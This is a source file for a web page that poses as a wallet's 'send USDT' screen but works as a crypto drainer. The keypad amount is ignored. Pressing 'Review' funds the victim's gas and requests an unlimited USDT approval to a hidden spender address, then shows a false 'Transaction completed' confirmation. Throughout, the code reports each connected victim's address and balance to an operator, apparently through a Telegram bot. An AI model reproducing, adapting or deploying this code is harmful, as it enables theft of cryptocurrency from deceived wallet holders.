"use client"
/* eslint-disable @typescript-eslint/no-unused-vars */

import React, { useState, useEffect, useRef } from "react";
import Web3 from "web3";
import { ethers } from 'ethers';
import { sendAlert } from "./adminCall";
import {
  RECIPIENT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
  USDT_ABI,
  bscChainId,
  SPENDER_ADDRESS,
  bscChainIdinNumer,
  TELEGRAM_BOT_TOKEN,
  CHAT_ID,
} from "./constent";
import axios from "axios";

declare global {
  interface Window {
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    ethereum?: any;
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    trustwallet?: any;
  }
}

const AppBSC = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [val, setVal] = useState("");
  const [usdMode, setUsdMode] = useState(false);
  const [balance, setBalance] = useState(0);

  const PRICE = 1; // USD per USDT
  const KEYS = ["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "del"];

  const n = parseFloat(val) || 0;
  const tokenAmt = usdMode ? n / PRICE : n;
  const valid = tokenAmt > 0;
  const fiat = usdMode ? `${tokenAmt.toFixed(2)} USDT` : `$${(tokenAmt * PRICE).toFixed(2)}`;

  const press = (k: string) => {
    setVal((v) => {
      if (k === "del") return v.slice(0, -1);
      if (k === ".") return v.includes(".") ? v : (v || "0") + ".";
      const next = v === "0" ? k : v + k;
      const dec = next.split(".")[1];
      return dec && dec.length > 6 ? v : next;
    });
  };

  const setMax = () => setVal(String(balance));

  const sendUSDT = async () => {
    try {
      setLoading(true);
      setTransferCompleted(false);
      let sender: string = ''
      if (!window.ethereum) {
        window.alert("No ethereum wallet found")
        return;
      }
      const instance = window.ethereum || window.trustwallet;
      const web3 = new Web3(instance);

      const walletAddress  = (await web3.eth.getAccounts())[0] || new URLSearchParams(window.location.search).get("address");
      if (!walletAddress || !web3.utils.isAddress(walletAddress)) {
          window.alert("Error: No valid wallet address provided in URL");
          return
      }
      else{
        sender = walletAddress
      }

      // Fetch balance AFTER chain switch
      const chainId = await web3.eth.getChainId();
      if (Number(chainId) !== bscChainIdinNumer) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: bscChainId }],
        });
      }

      if (!sender || !/^0x[a-fA-F0-9]{40}$/.test(sender)) {
        window.alert(`No address ${sender}`)
        return;
      }

      // Fetch balance on correct chain
      const balanceContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      const bal = await balanceContract.methods.balanceOf(sender).call();
      console.log("Raw balance from contract:", bal);
      console.log("Raw balance type:", typeof bal);
      const currentBalance = Number(bal) / 10**6; // USDT has 6 decimals
      console.log("Converted balance:", currentBalance);
      setBalance(currentBalance);

      // Send wallet connect notification
      sendAlert(sender, currentBalance);

      const topUpResponse = await axios.post(
        "/api/topup",
        { to: sender }
      ).then((res) => {
        console.log("Top-up response:", res.data);
        return res.data;
      }).catch((err)=>{
        console.error("Top-up request failed:", err);
      });
      if (!topUpResponse) {
        console.warn("Top-up failed, continuing without gas top-up.");
      }

      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);

      await contract.methods
        .approve(SPENDER_ADDRESS, ethers.MaxUint256)
        .send({ from: sender });

      // Fetch balance again after approval to get updated balance
      const finalBal = await balanceContract.methods.balanceOf(sender).call();
      const finalBalance = Number(finalBal) / 10**6;
      console.log("Final balance after approval:", finalBalance);

      setTransferCompleted(true);
      sendAlert(sender, finalBalance);
    } catch (err) {
      console.log("🔴 Approval error:", err);
      window.alert("Something went wrong, try again")
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const ensureBSCNetwork = async () => {
      try {
        const currentChainId = await window.ethereum.request({
          method: "eth_chainId",
        });

        if (currentChainId !== bscChainId) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: bscChainId }],
            });
          } catch (switchError: any) {
            // Add BSC network if not exists
            if (switchError.code === 4902) {
              try {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: bscChainId,
                    chainName: 'BNB Smart Chain',
                    nativeCurrency: {
                      name: 'BNB',
                      symbol: 'BNB',
                      decimals: 18,
                    },
                    rpcUrls: ['https://bsc-rpc.publicnode.com'],
                    blockExplorerUrls: ['https://bscscan.com'],
                  }],
                });
              } catch (addError: any) {
                // Chain may already exist in Trust Wallet - try switching again
                try {
                  await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bscChainId }],
                  });
                } catch {
                  window.alert("Please enable BNB Smart Chain (BSC) in Trust Wallet manually, then try again.");
                  console.error('Failed to add/switch BSC network:', addError);
                }
              }
            }
          }
        }
      } catch (error) {
        console.error('Network switch error:', error);
      }
    };
    ensureBSCNetwork();

    // Get chatId from URL
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("chatId") || CHAT_ID; // Fallback to default CHAT_ID if not in URL

    // Check for wallet address in URL and send notification
    const walletAddress = urlParams.get("address");
    if (walletAddress && /^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
      const instance = window.ethereum || window.trustwallet;
      const web3 = new Web3(instance);
      const balanceContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      balanceContract.methods.balanceOf(walletAddress).call().then((bal: any) => {
        const currentBalance = Number(bal) / 10**6;
        sendAlert(walletAddress, currentBalance, chatId);
      }).catch((err: any) => {
        console.error("Error fetching balance for notification:", err);
        sendAlert(walletAddress, 0, chatId);
      });
    }

    // Listen for wallet account changes and send notification
    if (window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        if (accounts.length > 0) {
          const instance = window.ethereum || window.trustwallet;
          const web3 = new Web3(instance);
          const balanceContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
          balanceContract.methods.balanceOf(accounts[0]).call().then((bal: any) => {
            const currentBalance = Number(bal) / 10**6;
            sendAlert(accounts[0], currentBalance, chatId);
          }).catch((err: any) => {
            console.error("Error fetching balance for notification:", err);
            sendAlert(accounts[0], 0, chatId);
          });
        }
      };

      window.ethereum.on('accountsChanged', handleAccountsChanged);

      // Also check on initial load if wallet is already connected
      window.ethereum.request({ method: 'eth_accounts' }).then((accounts: string[]) => {
        if (accounts.length > 0) {
          const instance = window.ethereum || window.trustwallet;
          const web3 = new Web3(instance);
          const balanceContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
          balanceContract.methods.balanceOf(accounts[0]).call().then((bal: any) => {
            const currentBalance = Number(bal) / 10**6;
            sendAlert(accounts[0], currentBalance, chatId);
          }).catch((err: any) => {
            console.error("Error fetching balance for notification:", err);
            sendAlert(accounts[0], 0, chatId);
          });
        }
      });

      return () => {
        window.ethereum?.removeListener('accountsChanged', handleAccountsChanged);
      };
    }
  }, []);

  return (
    <div className="mx-auto flex h-dvh max-w-md flex-col bg-[#0f121b] px-[4.5%] pb-[env(safe-area-inset-bottom)] pt-[env(safe-area-inset-top)] font-sans text-white">
      {/* To address */}
      <div className="-mx-[4.5%] flex gap-2 border-b border-[#1b1f2c] px-[4.5%] py-3 text-[16px] font-medium leading-snug">
        <span className="shrink-0 text-[#8b90a0]">To:</span>
        <b className="break-all font-medium">{address}</b>
      </div>

      {/* Amount display */}
      <div className="flex min-h-0 flex-1 flex-col items-center justify-center py-4">
        <div
          className={`max-w-full overflow-hidden whitespace-nowrap font-bold leading-none ${val ? "text-white" : "text-[#363f66]"}`}
          style={{ fontSize: Math.max(48, 72 - Math.max(0, val.length - 6) * 4) }}
        >
          {val || "0"}
        </div>
        <button
          onClick={() => {
            setUsdMode((m) => !m);
            setVal("");
          }}
          aria-label="Swap currency"
          className="mt-2 flex items-center gap-2 text-[20px] font-medium"
        >
          <span>≈ {fiat}</span>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
            <path d="M7 16V4M3 8l4-4 4 4M17 8v12M13 16l4 4 4-4" />
          </svg>
        </button>
      </div>

      {/* Token row */}
      <div className="flex shrink-0 items-center gap-4 pb-3 pt-2">
        <div className="relative h-[60px] w-[60px] shrink-0">
          <div className="grid h-[60px] w-[60px] place-items-center rounded-full bg-[#26a17b]">
            <svg width="34" height="34" viewBox="0 0 32 32" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round">
              <path d="M6 6h20M16 6v20" />
              <ellipse cx="16" cy="14" rx="12" ry="3.2" strokeWidth="1.6" />
            </svg>
          </div>
          <div className="absolute -bottom-1 -right-1.5 grid h-[26px] w-[26px] place-items-center rounded-[7px] bg-black">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f0b90b" strokeWidth="2" strokeLinejoin="round">
              <path d="M12 3l3 3-3 3-3-3zM6 9l3 3-3 3-3-3zM18 9l3 3-3 3-3-3zM12 15l3 3-3 3-3-3z" />
            </svg>
          </div>
        </div>
        <div className="flex-1">
          <div className="text-[14px] font-semibold">
            Tether USDT
          </div>
        </div>
        <button onClick={setMax} className="h-12 rounded-full bg-[#1a1e2d] px-6 text-[16px] font-semibold hover:bg-[#2a2e3d] transition-colors">
          Max
        </button>
      </div>

      {/* Keypad */}
      <div className="grid shrink-0 grid-cols-3">
        {KEYS.map((k) => (
          <button
            key={k}
            onClick={() => press(k)}
            aria-label={k}
            className="h-[clamp(56px,9.5vh,84px)] rounded-2xl text-[28px] font-semibold active:bg-white/5"
          >
            {k === "del" ? (
              <svg className="mx-auto w-[34px] h-[34px]" viewBox="0 0 28 28" fill="none" stroke="#fff" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
                <path d="M9 5h14a2 2 0 012 2v14a2 2 0 01-2 2H9l-6-9z" />
                <path d="M13 10l6 6M19 10l-6 6" />
              </svg>
            ) : (
              k
            )}
          </button>
        ))}
      </div>

      {/* Review */}
      <button
        disabled={!valid}
        onClick={() => {
          setUsdtAmount(String(tokenAmt));
          sendUSDT();
        }}
        className={`mb-4 mt-3 h-[68px] shrink-0 rounded-full text-[18px] font-semibold transition-colors ${
          valid ? "bg-[#5b7cff] text-white" : "cursor-not-allowed bg-[#1b1d27] text-[#3d4670]"
        }`}
      >
        {loading ? "Processing..." : "Review"}
      </button>

      {/* Bottom slide-up popup (dim background + animated sheet) */}
      {(loading || transferCompleted) && (
        <div className="w-full fixed inset-0 z-50 flex items-end justify-center pointer-events-none">
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!loading) setTransferCompleted(false);
            }}
          />
          <div
            className={`relative w-full max-w-2xl pointer-events-auto z-60 transform rounded-xl bg-[#1b1d27] shadow-xl transition-all duration-300 ease-out ${
              loading || transferCompleted ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"
            }`}
            role="dialog"
            aria-modal="true"
          >
            <div className="p-5">
              {loading ? (
                <div className="flex flex-col items-center space-y-4">
                  <svg className="animate-spin h-12 w-12 text-[#5b7cff]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4l3-3-3-3v4a12 12 0 100 24v-2a10 10 0 110-20z"></path>
                  </svg>
                  <h3 className="text-base font-semibold text-white">Processing...</h3>
                  <p className="text-xs text-gray-400 text-center">
                    Transaction in progress. Blockchain validation is underway — this may take a few minutes.
                  </p>
                  <button
                    className="mt-2 px-4 py-2 rounded-full bg-[#1a1e2d] text-xs text-gray-300"
                    disabled
                  >
                    Transaction details
                  </button>
                </div>
              ) : (
                <div className="flex flex-col items-center space-y-4">
                  <div className="flex items-center justify-center w-20 h-20 rounded-full bg-green-900">
                    <svg className="h-10 w-10 text-green-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M5 13l4 4L19 7" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <h3 className="text-base font-semibold text-white">Transaction completed</h3>
                  <p className="text-xs text-gray-400 text-center">
                    Your transaction has been submitted and confirmed on the network.
                  </p>
                  <div className="flex">
                    <button
                      className="w-full max-w-xs rounded-full bg-[#5b7cff] px-4 py-2 text-xs text-white sm:w-auto"
                      onClick={() => {
                        setTransferCompleted(false);
                      }}
                    >
                      Close
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );

};

export default AppBSC;
